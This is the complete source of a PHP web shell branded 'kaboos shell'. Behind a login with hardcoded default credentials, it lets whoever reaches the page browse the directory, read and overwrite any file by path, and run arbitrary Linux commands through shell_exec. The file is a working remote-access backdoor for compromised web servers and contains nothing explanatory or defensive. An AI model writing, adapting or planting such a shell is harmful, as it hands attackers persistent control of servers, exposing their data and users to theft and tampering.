<?php
session_start();

// Define credentials
define('USERNAME', 'user');
define('PASSWORD', 'password');

// Check if user is already logged in
if (!isset($_SESSION['loggedin'])) {
    $_SESSION['loggedin'] = false;
}

// Handle login form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login'])) {
    $inputUser = $_POST['username'];
    $inputPass = $_POST['password'];
    
    if ($inputUser === USERNAME && $inputPass === PASSWORD) {
        $_SESSION['loggedin'] = true;
        $message = "Login successful!";
    } else {
        $message = "Invalid credentials.";
    }
}

// Handle logout
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// Check if user is authenticated
if (!$_SESSION['loggedin']) {
    // Show login form
    echo '<!DOCTYPE html>
<html>
<head>
    <title>Login</title>
    <style>
        body {
            background-color: #000;
            color: #00FF00;
            font-family: \'Courier New\', Courier, monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        form {
            background-color: #111;
            padding: 20px;
            border: 1px solid #00FF00;
        }
        label, input {
            display: block;
            margin-bottom: 10px;
        }
        input[type="text"], input[type="password"] {
            background-color: #000;
            color: #00FF00;
            border: 1px solid #00FF00;
            padding: 5px;
        }
        input[type="submit"] {
            background-color: #000;
            color: #00FF00;
            border: 1px solid #00FF00;
            padding: 5px 10px;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: #00FF00;
            color: #000;
        }
        .message {
            margin-bottom: 10px;
            color: #FF0000;
        }
    </style>
</head>
<body>
    <form method="post">
        <h1>Login</h1>
        <label for="username">Username:</label>
        <input type="text" id="username" name="username" required>
        <label for="password">Password:</label>
        <input type="password" id="password" name="password" required>
        <input type="submit" name="login" value="Login">
    </form>
</body>
</html>';
    exit;
}

// Main script functionality
$action = '';
$filename = '';
$content = '';
$message = $message ?? '';
$output = '';
$directory = './'; // Directory to browse

// Handle form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_POST['login'])) {
    $action = $_POST['action'];
    
    if ($action === 'open' && isset($_POST['filename'])) {
        // Open the file
        $filename = $_POST['filename'];
        if (file_exists($filename)) {
            $content = file_get_contents($filename);
        } else {
            $message = "File does not exist.";
        }
    } elseif ($action === 'save' && isset($_POST['filename']) && isset($_POST['content'])) {
        // Save the file
        $filename = $_POST['filename'];
        $content = $_POST['content'];
        if (file_put_contents($filename, $content) !== false) {
            $message = "File saved successfully.";
        } else {
            $message = "Failed to save the file.";
        }
    } elseif ($action === 'command' && isset($_POST['command'])) {
        // Execute the command
        $command = escapeshellcmd($_POST['command']);
        $output = shell_exec($command);
    }
}

// Read the files in the directory
$files = scandir($directory);
?>

<!DOCTYPE html>
<html>
<head>
    <title>PHP File Editor and Terminal</title>
    <style>
        body {
            background-color: #000;
            color: #00FF00;
            font-family: 'Courier New', Courier, monospace;
        }
        h1, h2 {
            color: #00FF00;
        }
        a {
            color: #00FF00;
            text-decoration: none;
        }
        a:hover {
            text-decoration: underline;
        }
        input[type="text"], input[type="password"], textarea {
            background-color: #000;
            color: #00FF00;
            border: 1px solid #00FF00;
            padding: 5px;
        }
        input[type="submit"] {
            background-color: #000;
            color: #00FF00;
            border: 1px solid #00FF00;
            padding: 5px 10px;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: #00FF00;
            color: #000;
        }
        pre {
            background-color: #000;
            color: #00FF00;
            border: 1px solid #00FF00;
            padding: 10px;
            overflow-x: auto;
        }
        ul {
            list-style-type: none;
            padding: 0;
        }
        ul li {
            margin: 5px 0;
        }
    </style>
</head>
<body>
<div class="spider-web"></div>
    <div class="ascii-art">
        
        <pre>
              _____
        ,-:` \;',`'-, 
      .'-;_,;  ':-;_,'.
     /;   '/    ,  _`.-\
    | '`. (`     /` ` \`|
    |:.  `\`-.   \_   / |
    |     (   `,  .`\ ;'|
     \     | .'     `-'/
      `.   ;/        .'
        `'-._____.
        </pre>
    </div>
    <h1>welcome to kaboos shell</h1>
    <p><a href="?logout">Logout</a></p>
    
    <h2>Files in Directory</h2>
    <ul>
        <?php foreach ($files as $file): ?>
            <?php if (is_file($directory . $file)): ?>
                <li><a href="?filename=<?php echo urlencode($directory . $file); ?>"><?php echo htmlspecialchars($file); ?></a></li>
            <?php endif; ?>
        <?php endforeach; ?>
    </ul>

    <h2>Edit Files</h2>
    <form method="post">
        <label for="filename">File Name:</label>
        <input type="text" id="filename" name="filename" value="<?php echo htmlspecialchars($filename); ?>" required>
        <input type="hidden" name="action" value="open">
        <input type="submit" value="Open">
    </form>
    
    <?php if ($action === 'open' && file_exists($filename)): ?>
    <form method="post">
        <input type="hidden" name="filename" value="<?php echo htmlspecialchars($filename); ?>">
        <input type="hidden" name="action" value="save">
        <textarea name="content" rows="20" cols="80"><?php echo htmlspecialchars($content); ?></textarea><br>
        <input type="submit" value="Save">
    </form>
    <?php endif; ?>

    <h2>Run Linux Commands</h2>
    <form method="post">
        <label for="command">Command:</label>
        <input type="text" id="command" name="command" required>
        <input type="hidden" name="action" value="command">
        <input type="submit" value="Run">
    </form>
    
    <?php if ($output): ?>
    <h3>Output:</h3>
    <pre><?php echo htmlspecialchars($output); ?></pre>
    <?php endif; ?>
    
    <?php if ($message): ?>
    <p><?php echo htmlspecialchars($message); ?></p>
    <?php endif; ?>
</body>
</html>
